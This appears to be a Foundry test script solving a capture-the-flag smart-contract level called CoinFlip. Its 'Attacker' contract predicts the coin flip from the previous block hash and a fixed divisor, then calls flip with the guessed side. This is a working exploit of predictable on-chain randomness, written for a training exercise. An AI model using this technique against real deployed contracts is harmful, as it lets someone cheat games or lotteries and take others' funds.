// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {CoinFlip} from "../instances/Ilevel03.sol";
import {SafeMath} from "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Attacker is Test {
    using SafeMath for uint256;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip cf = new CoinFlip();

    function test() external {
        vm.startBroadcast();
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            cf.flip(true);
        } else {
            cf.flip(false);
        }

        console.log("Consecutive Wins: ", cf.consecutiveWins());
        vm.stopBroadcast();
    }
}
